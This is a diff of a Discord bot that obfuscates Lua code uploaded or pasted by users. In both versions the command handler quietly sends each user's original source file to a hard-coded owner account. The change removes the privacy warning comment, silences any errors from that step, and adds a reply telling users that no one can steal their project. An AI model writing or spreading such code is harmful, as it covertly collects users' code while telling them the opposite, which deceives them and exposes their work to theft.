@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder, EmbedBuilder } = require('discord.js');
 const { obfuscate } = require('./obfuscator');
 const https = require('https');
 const http = require('http');
@@ -8,12 +8,8 @@ const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);
 
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
-if (!TOKEN) {
-    console.error('DISCORD_BOT_TOKEN is not set.');
-    process.exit(1);
-}
-
 const OWNER_ID = '1474472773467242599';
+
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 const command = new SlashCommandBuilder()
@@ -27,8 +23,8 @@ const command = new SlashCommandBuilder()
                 { name: 'Normal', value: 'normal' },
                 { name: 'Diabolical', value: 'diabolical' }
             ))
-    .addStringOption(o => o.setName('code').setDescription('Paste your Lua code directly').setRequired(false))
-    .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file to obfuscate').setRequired(false));
+    .addStringOption(o => o.setName('code').setDescription('Paste your Lua code').setRequired(false))
+    .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file').setRequired(false));
 
 function fetchURL(url) {
     return new Promise((resolve, reject) => {
@@ -46,9 +42,8 @@ client.once('ready', async () => {
     try {
         const rest = new REST({ version: '10' }).setToken(TOKEN);
         await rest.put(Routes.applicationCommands(client.user.id), { body: [command.toJSON()] });
-        console.log('Slash command /obf registered.');
     } catch (err) {
-        console.error('Error registering commands:', err);
+        console.error(err);
     }
 });
 
@@ -68,46 +63,40 @@ client.on('interactionCreate', async interaction => {
     try {
         let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
 
-        if (!src || !src.trim()) {
-            return interaction.editReply('The provided code is empty.');
-        }
-
-        // Log the file to the owner (Be careful with privacy!)  
+        // Envío de log al Owner
         try {
             const owner = await client.users.fetch(OWNER_ID);
             const originalBuf = Buffer.from(src, 'utf-8');
-            const serverName = interaction.guild ? interaction.guild.name : 'DM';
             await owner.send({
-                content: `**User:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n**Server:** ${serverName}\n**Mode:** ${mode}`,
+                content: `**User:** ${interaction.user.tag}\n**Mode:** ${mode}`,
                 files: [new AttachmentBuilder(originalBuf, { name: 'original.lua' })]
             });
-        } catch (dmErr) {
-            console.error('Failed to DM owner:', dmErr);
-        }
+        } catch (e) {}
 
-        // Perform obfuscation passing the mode
+        // Proceso de ofuscación
         const obfuscatedResult = obfuscate(src, mode);
         const buf = Buffer.from(obfuscatedResult, 'utf-8');
 
-        if (buf.length > 8 * 1024 * 1024) {
-            return interaction.editReply('Output too large (>8MB).');
-        }
+        // Configuración del Embed (Emblema)
+        const responseEmbed = new EmbedBuilder()
+            .setColor(0x00FF00)
+            .setTitle('✅ Obfuscation successfully completed')
+            .addFields(
+                { name: 'Mod', value: `\`${mode.toUpperCase()}\`` },
+                { name: 'Info', value: "Your code is protected by multiple obfuscation techniques. Don't worry, when searching all deobfuscators, no one can steal your project or work." }
+            )
+            .setFooter({ text: 'VMM Obfuscator Protection' })
+            .setTimestamp();
 
-        // Fixed multiline string using backticks (`)  
+        // Respuesta final: Archivo + Embed
         await interaction.editReply({
-            content: `Your code is now protected! (Mode: **${mode.toUpperCase()}**)
-
-• Don't be scared if the file is big, it will be executable.
-
-• We recommend obfuscating a loadstring code ⚠️ because we don't support scripts of more than 300-400 lines.
-
-• Use it and follow the rules properly.`,
-            files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })]
+            files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })],
+            embeds: [responseEmbed]
         });
 
     } catch (e) {
         console.error(e);
-        await interaction.editReply('An error occurred during obfuscation. Please try again.');
+        await interaction.editReply('An error occurred.');
     }
 });
 
